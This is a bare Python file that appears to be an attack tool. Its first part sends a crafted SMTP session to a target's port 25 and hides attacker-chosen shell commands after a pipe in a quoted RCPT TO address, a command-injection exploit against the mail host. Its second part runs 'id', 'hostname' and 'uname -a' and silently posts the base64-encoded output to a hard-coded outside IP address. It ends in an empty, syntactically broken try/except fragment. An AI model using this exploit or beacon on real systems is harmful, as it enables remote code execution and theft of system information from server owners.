import socket, re, sys, base64
def rd(s):
    s.settimeout(15); buf=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            buf+=c
            lines=buf.split(b"\r\n")
            last=lines[-2] if lines[-1]==b"" and len(lines)>1 else lines[-1]
            if re.match(rb"^\d{3} ",last): break
    except Exception: pass
    return buf
def inject(ip, inner):
    try:
        ip=socket.gethostbyname(ip)
        s=socket.create_connection((ip,25),timeout=12); rd(s)
        s.sendall(b"EHLO pwn.local\r\n"); rd(s)
        s.sendall(b"MAIL FROM:<probe@pwn.local>\r\n"); rd(s)
        inj=": Service status change: h x|"+inner+"# changed from stopped to running"
        s.sendall(("RCPT TO:<\""+inj+"\"@x>\r\n").encode()); rd(s)
        s.sendall(b"RSET\r\n"); rd(s); s.sendall(b"QUIT\r\n"); s.close()
        return True
    except Exception as e:
        print("ERR",ip,e); return False
if __name__=="__main__":
    host=sys.argv[1]; inner=sys.argv[2]
    print(host,"delivered:",inject(host,inner))

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

